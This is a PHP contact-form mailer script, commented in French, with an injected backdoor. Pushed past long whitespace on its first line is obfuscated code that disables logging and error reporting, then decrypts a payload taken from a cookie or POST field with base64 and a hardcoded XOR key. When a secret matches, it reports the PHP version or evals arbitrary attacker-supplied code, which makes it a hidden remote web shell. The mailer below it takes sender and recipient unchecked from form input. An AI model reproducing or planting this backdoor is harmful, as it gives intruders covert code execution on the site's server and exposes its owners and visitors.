<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $d6abb = 887;$GLOBALS['ic8d']=Array();global$ic8d;$ic8d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['cbd4d3e2']="\x37\x26\x3e\x7e\x3a\x5c\x48\x2e\x56\x6b\x53\x3c\x50\x24\x76\x28\x67\x6e\x57\x4c\x32\x3b\x4b\x2c\x2d\x5b\x21\x47\x6f\x36\x27\x62\x61\x59\x2f\xd\x38\x45\x35\x4a\x71\x29\x2a\x79\x6d\x78\x75\x44\x31\x54\x9\x46\x43\x7c\x40\x4f\x60\x41\x42\x58\x23\x6c\x5e\x4e\x55\x30\x5f\x64\x77\x70\x39\x72\x7b\x6a\x49\x2b\x25\x5a\x66\x52\x3d\x68\x63\x4d\x7a\x34\x22\x3f\x65\x33\x51\x69\x20\x74\x5d\x73\xa\x7d";$ic8d[$ic8d['cbd4d3e2'][14].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][29]]=$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][81].$ic8d['cbd4d3e2'][71];$ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][89]]=$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][67];$ic8d[$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][38]]=$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][17];$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][85]]=$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][17].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][93];$ic8d[$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][78]]=$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][84].$ic8d['cbd4d3e2'][88];$ic8d[$ic8d['cbd4d3e2'][73].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][65]]=$ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][81].$ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][14].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][17];$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70]]=$ic8d['cbd4d3e2'][46].$ic8d['cbd4d3e2'][17].$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][84].$ic8d['cbd4d3e2'][88];$ic8d[$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][0]]=$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][88];$ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][29]]=$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][44].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][44].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][93];$ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][20]]=$ic8d['cbd4d3e2'][81].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88];$ic8d[$ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][0]]=$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][36];$ic8d[$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][70]]=$_POST;$ic8d[$ic8d['cbd4d3e2'][9].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][67]]=$_COOKIE;@$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][85]]($ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][16],NULL);@$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][85]]($ic8d['cbd4d3e2'][61].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][71].$ic8d['cbd4d3e2'][95],0);@$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][85]]($ic8d['cbd4d3e2'][44].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][45].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][45].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][46].$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][28].$ic8d['cbd4d3e2'][17].$ic8d['cbd4d3e2'][66].$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][44].$ic8d['cbd4d3e2'][88],0);@$ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][29]](0);$x2d826=NULL;$qd44986c4=NULL;$ic8d[$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][29]]=$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][24].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][24].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][24].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][24].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][36];global$ae5925f6;function f0c8($x2d826,$dd00){global$ic8d;$c5520f="";for($t60a0d=0;$t60a0d<$ic8d[$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][38]]($x2d826);){for($d66e=0;$d66e<$ic8d[$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][38]]($dd00)&&$t60a0d<$ic8d[$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][85].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][38]]($x2d826);$d66e++,$t60a0d++){$c5520f.=$ic8d[$ic8d['cbd4d3e2'][14].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][29]]($ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][89]]($x2d826[$t60a0d])^$ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][89]]($dd00[$d66e]));}}return$c5520f;}function hb62be($x2d826,$dd00){global$ic8d;global$ae5925f6;return$ic8d[$ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][0]]($ic8d[$ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][0]]($x2d826,$ae5925f6),$dd00);}foreach($ic8d[$ic8d['cbd4d3e2'][9].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][67]]as$dd00=>$p120e249f){$x2d826=$p120e249f;$qd44986c4=$dd00;}if(!$x2d826){foreach($ic8d[$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][70]]as$dd00=>$p120e249f){$x2d826=$p120e249f;$qd44986c4=$dd00;}}$x2d826=@$ic8d[$ic8d['cbd4d3e2'][91].$ic8d['cbd4d3e2'][67].$ic8d['cbd4d3e2'][78].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70]]($ic8d[$ic8d['cbd4d3e2'][16].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][29].$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][20]]($ic8d[$ic8d['cbd4d3e2'][31].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][89].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][0]]($x2d826),$qd44986c4));if(isset($x2d826[$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][9]])&&$ae5925f6==$x2d826[$ic8d['cbd4d3e2'][32].$ic8d['cbd4d3e2'][9]]){if($x2d826[$ic8d['cbd4d3e2'][32]]==$ic8d['cbd4d3e2'][91]){$t60a0d=Array($ic8d['cbd4d3e2'][69].$ic8d['cbd4d3e2'][14]=>@$ic8d[$ic8d['cbd4d3e2'][73].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][88].$ic8d['cbd4d3e2'][38].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][65]](),$ic8d['cbd4d3e2'][95].$ic8d['cbd4d3e2'][14]=>$ic8d['cbd4d3e2'][48].$ic8d['cbd4d3e2'][7].$ic8d['cbd4d3e2'][65].$ic8d['cbd4d3e2'][24].$ic8d['cbd4d3e2'][48],);echo@$ic8d[$ic8d['cbd4d3e2'][93].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][20].$ic8d['cbd4d3e2'][82].$ic8d['cbd4d3e2'][0].$ic8d['cbd4d3e2'][70].$ic8d['cbd4d3e2'][36].$ic8d['cbd4d3e2'][78]]($t60a0d);}elseif($x2d826[$ic8d['cbd4d3e2'][32]]==$ic8d['cbd4d3e2'][88]){eval/*u7eb2c118*/($x2d826[$ic8d['cbd4d3e2'][67]]);}exit();} ?><?

/* PARAMETRAGE DU SCRIPT */
if (isset($_POST['action']))
    $action = $_POST['action'];
if ($action == "message") {
    $email = $_POST['email'];
    $subject = $_POST['subject']; /* Objet du mail (utile si vous utilisez ce script sur plusieures pages de votre site) */
    $version = '';
    //$lang = 'fr';
    $msg = $_POST['msg'];
    $dest = $_POST['dest']; /* A qui s'adresse ce mail (TO) */
    $copy_dest = ""; /* Email pour la Copie Carbone (CC) */
    $cache_dest = ""; /* Email pour la Copie Carbone (BCC) */
    $objet_page_pre = "";
    $objet_page_suf = "";
    $redirection = ""; //"http://oliduha.free.fr/2014/ /* Redirection vers une autre page une fois l'envoie effectu� */
    $priority = "3"; /* Permet de d�finir la priorit� du mail, les valeurs vont de 1 (urgent) � 5 (priorit� basse) */
    //switch ($lang) { /* R�ponse de l'envoi du mail selon la langue */
    /*    case 'fr':
            $reponse = StripSlashes("OK, votre message a bien &eacute;t&eacute; envoy&eacute; !");
            break;
        case 'en':
        default:
            $reponse = StripSlashes("OK, your message has been correctly sent.");
            break;
    }*/
} else {
    redir("http://ecochantiersenecohabitats.org");
    exit;
}
/* FIN DU PARAMETRAGE */
if ($redirection != "")
    $url_redir = $redirection;

class Mail {

    var $sendto = array();
    var $from, $msubject;
    var $acc = array();
    var $abcc = array();
    var $aattach = array();
    var $priorities = array('1 (Highest)', '2 (High)', '3 (Normal)', '4 (Low)', '5 (Lowest)');

    // Mail contructor
    function Mail() {
        $this->autoCheck(false);
    }

    /* autoCheck( $boolean )
     * activate or desactivate the email addresses validator
     * ex: autoCheck( true ) turn the validator on
     * by default autoCheck feature is on */

    function autoCheck($bool) {
        if ($bool)
            $this->checkAddress = true;
        else
            $this->checkAddress = false;
    }

    /* Subject( $subject )
     * define the subject line of the email
     * $subject: any valid mono-line string */

    function Subject($subject) {
        $this->msubject = strtr($subject, "\r\n", "  ");
    }

    /* From( $from )
     * set the sender of the mail
     * $from should be an email address */

    function From($from) {
        if (!is_string($from)) {
            echo "Class Mail: Erreur, From n'est pas de la bonne forme";
            exit;
        }
        $this->from = $from;
    }

    /* To( $to )
     * set the To ( recipient )
     * $to : email address, accept both a single address or an array of addresses */

    function To($to) {
        // TODO : test validit� sur to
        if (is_array($to))
            $this->sendto = $to;
        else
            $this->sendto[] = $to;
        if ($this->checkAddress == true)
            $this->CheckAdresses($this->sendto);
    }

    /* Cc()
     * set the CC headers ( carbon copy )
     * $cc : email address(es), accept both array and string */

    function Cc($cc) {
        if (is_array($cc))
            $this->acc = $cc;
        else
            $this->acc[] = $cc;
        if ($this->checkAddress == true)
            $this->CheckAdresses($this->acc);
    }

    /* Bcc()
     * set the Bcc headers (blank carbon copy).
     * $bcc : email address(es), accept both array and string */

    function Bcc($bcc) {
        if (is_array($bcc)) {
            $this->abcc = $bcc;
        } else {
            $this->abcc[] = $bcc;
        }
        if ($this->checkAddress == true)
            $this->CheckAdresses($this->abcc);
    }

    /* Body()
     * set the body of the mail ( message ) */

    function Body($body) {
        $this->body = $body;
    }

    /* Send()
     * format and send the mail */

    function Send() {
        // build the headers
        $this->_build_headers();
        // include attached files
        if (sizeof($this->aattach > 0)) {
            $this->_build_attachement();
            $body = $this->fullBody . $this->attachment;
        }
        // envoie du mail aux destinataires principaux
        for ($i = 0; $i < sizeof($this->sendto); $i++) {
            $res = mail($this->sendto[$i], $this->msubject, $body, $this->headers);
            // TODO : trmt res
        }
    }

    /* Organization( $org )
     * set the Organisation header */

    function Organization($org) {
        if (trim($org != ""))
            $this->organization = $org;
    }

    /* Priority( $priority )
     * set the mail priority
     * $priority : integer taken between 1 (highest) and 5 ( lowest )
     * ex: $m->Priority(1) ; => Highest */

    function Priority($priority) {
        if (!intval($priority))
            return false;
        if (!isset($this->priorities[$priority - 1]))
            return false;
        $this->priority = $this->priorities[$priority - 1];
        return true;
    }

    /* Attach( $filename, $filetype )
     * attach a file to the mail
     * $filename : path of the file to attach
     * $filetype : MIME-type of the file. default to 'application/x-unknown-content-type'
     * $disposition : instruct the Mailclient to display the file if possible ("inline") or always as a link ("attachment")
     * possible values are "inline", "attachment" */

    function Attach($filename, $filetype = 'application/x-unknown-content-type', $disposition = "inline") {
        // TODO : si filetype="", alors chercher dans un tablo de MT connus / extension du fichier
        $this->aattach[] = $filename;
        $this->actype[] = $filetype;
        $this->adispo[] = $disposition;
    }

    /* Get()
     * return the whole e-mail , headers + message
     * can be used for displaying the message in plain text or logging it */

    function Get() {
        $this->_build_headers();
        if (sizeof($this->aattach > 0)) {
            $this->_build_attachement();
            $this->body = $this->body . $this->attachment;
        }
        $mail = $this->headers;
        $mail .= "\n$this->body";
        return $mail;
    }

    /* ValidEmail( $email )
     * return true if email adress is ok - regex from Manuel Lemos (mlemos@acm.org)
     * $address : email address to check */

    function ValidEmail($address) {
        if (ereg(".*<(.+)>", $address, $regs)) {
            $address = $regs[1];
        }
        if (ereg("^[^@  ]+@([a-zA-Z0-9\-]+\.)+([a-zA-Z0-9\-]{2}|net|fr|com|gov|mil|org|edu|int)\$", $address))
            return true;
        else
            return false;
    }

    /* CheckAdresses()
     * check validity of email addresses
     * if unvalid, output an error message and exit, this may be customized
     * $aad : array of emails addresses */

    function CheckAdresses($aad) {
        for ($i = 0; $i < sizeof($aad); $i++) {
            if (!$this->ValidEmail($aad[$i])) {
                echo "Class Mail, method Mail : Adresse Invalide $aad[$i]";
                exit;
            }
        }
    }

    /*     * ******************** PRIVATE METHODS BELOW ********************************* */

    /* _build_headers()
     * [INTERNAL] build the mail headers */

    function _build_headers() {
        // creation du header mail
        $this->headers = "From: $this->from\n";
        $this->to = implode(", ", $this->sendto);

        if (count($this->acc) > 0) {
            $this->cc = implode(", ", $this->acc);
            $this->headers .= "CC: $this->cc\n";
        }
        if (count($this->abcc) > 0) {
            $this->bcc = implode(", ", $this->abcc);
            $this->headers .= "BCC: $this->bcc\n";
        }
        if ($this->organization != "")
            $this->headers .= "Organization: $this->organization\n";

        if ($this->priority != "")
            $this->headers .= "X-Priority: $this->priority\n";
    }

    /*
     * _build_attachement()
     * internal use only - check and encode attach file(s) */

    function _build_attachement() {
        $this->boundary = "------------" . md5(uniqid("myboundary")); // TODO : variable bound
        $this->headers .= "MIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"$this->boundary\"\n\n";
        $this->fullBody = "This is a multi-part message in MIME format.\n--$this->boundary\nContent-Type: text/plain; charset=us-ascii\nContent-Transfer-Encoding: 7bit\n\n" . $this->body . "\n";
        $sep = chr(13) . chr(10);
        $ata = array();
        $k = 0;
        // for each attached file, do...
        for ($i = 0; $i < sizeof($this->aattach); $i++) {
            $filename = $this->aattach[$i];
            $basename = basename($filename);
            $ctype = $this->actype[$i];        // content-type
            $disposition = $this->adispo[$i];
            if (!file_exists($filename)) {
                echo "Class Mail, method attach : file $filename can't be found";
                exit;
            }
            $subhdr = "--$this->boundary\nContent-type: $ctype;\n name=\"$basename\"\nContent-Transfer-Encoding: base64\nContent-Disposition: $disposition;\n  filename=\"$basename\"\n";
            $ata[$k++] = $subhdr;
            // non encoded line length
            $linesz = filesize($filename) + 1;
            $fp = fopen($filename, 'r');
            $data = base64_encode(fread($fp, $linesz));
            fclose($fp);
            $ata[$k++] = chunk_split($data);
        }
        $this->attachment = implode($sep, $ata);
    }

}

// class Mail
/* Function redirection sans Header */

function redir($url_redir) {
    echo "<script language=\"javascript\">";
    echo "window.location=('$url_redir');";
    echo "</script>";
}

// StripSlashes les variables
$subject = StripSlashes($subject);
$version = StripSlashes($version);
$lang = StripSlashes($lang);
$msg = StripSlashes($msg);
//Construit les chaines subjet et msg
$subject .= "[" . $version . "]" . "[" . $lang . "]";
setlocale(LC_ALL, 'french');
$msg = $objet_page_pre . "[" . $version . "]" . "[" . $lang . "]" . $objet_page_suf . $email . " le " . date("d/m/Y � H:i:s") . " :\n\n" . $msg;
/* Contruction du mail */
$m = new Mail; // create the mail
$m->From("$email");
$m->To("$dest");
$m->Subject("$subject");
$m->Body($msg); // set the body
if ($copy_dest != "") {/* S'il y a une copie conforme du mail */
    $m->Cc("$copy_dest");
}
$m->Priority($priority);
if ($cache_dest != "") {/* S'il y a une copie cach�e du mail */
    $m->Bcc("$cache_dest");
}
$m->Priority($priority);
if ("$NomFichier_name" != "") {/* J'attache mon fichier */
    copy("$NomFichier", "../upload/$NomFichier_name");
    $m->Attach("../upload/$NomFichier_name", "application/octet-stream");
}
$m->Send(); /* Envoi du mail */
if ("$NomFichier_name" != "") {
    Unlink("../upload/$NomFichier_name");
}
echo "$reponse"; /* Affichage du message d'envoi r�ussi */
if ("$redirection" != "") {
    redir("$url_redir"); /* je renvoie sur une url sp�cifique */
}
?>